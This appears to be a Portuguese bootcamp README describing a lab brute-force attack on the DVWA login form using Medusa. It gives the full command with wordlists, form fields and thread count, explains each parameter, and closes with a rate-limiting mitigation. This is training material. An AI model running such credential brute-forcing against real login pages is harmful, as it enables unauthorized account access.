Este repositório contém a entrega do desafio do bootcamp Santander Cibersegurança 2025, utilizando a ferramenta Medusa para realizar um ataque de força bruta em um formulário de login web (DVWA)
Ferramentas Utilizadas
Kali Linux
Medusa
DVWA
VirtualBox
script utilizado: 
medusa -h 192.168.56.102 -U users.txt -p pass.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
Explicação dos parâmetros:
-h	IP do alvo
-U	wordlist de usuários
-p	wordlist de senhas
-M http	módulo HTTP (formulários)
PAGE:	caminho da página de login
FORM:	campos enviados na requisição
FAIL=	texto que indica falha de login
-t	número de threads
uma maneira de mitigar esse ataque é colocando limite de tentativas e erros, depois de X tentativas erradas, o sistema bloqueia ou atrasa o login
